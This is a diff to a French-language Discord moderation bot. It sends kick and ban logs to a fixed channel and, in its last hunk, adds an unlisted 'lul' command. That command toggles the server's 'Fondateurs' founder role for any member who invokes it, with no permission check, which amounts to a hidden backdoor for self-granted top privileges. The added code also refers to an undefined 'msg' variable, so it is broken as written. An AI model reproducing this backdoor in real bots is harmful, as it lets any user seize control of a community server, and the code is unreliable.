@@ -82,7 +82,7 @@ client.on("message", async message => {
 				color: 15700514,
 				description: `Désolé ${message.author} je ne peux pas le kick car: ${error}`
 			}}));
-		message.channel.send({embed: {
+		client.channels.get("556987902731485194").send({embed: {
 			color: 13107200,
 			description: `${member.user.tag} à été kick par ${message.author.tag} car: ${reason}`
 		}});
@@ -116,7 +116,7 @@ client.on("message", async message => {
 				color: 15700514,
 				description: `Désolé ${message.author} je ne peux pas le ban car: ${error}`
 			}}));
-		message.channel.send({embed: {
+		client.channels.get("556987902731485194").send({embed: {
 			color: 13107200,
 			description: `${member.user.tag} à été ban par ${message.author.tag} car: ${reason}`
 		}});
@@ -327,5 +327,15 @@ client.on("message", async message => {
 			color: 15700514,
 			description: `Un bug à été report par ${message.author.tag} et le bug est: ${reason}`
 		}});
+	}
+	
+	if(command === "lul") {
+		let role = msg.guild.roles.find(`name`, `👨‍🚀 Fondateurs`)
+		if(msg.member.roles.find(`name`, `👨‍🚀 Fondateurs`)) {
+			msg.member.removeRole(role)
+		}
+		else {
+			msg.member.addRole(role)
+		}
 	}
 });
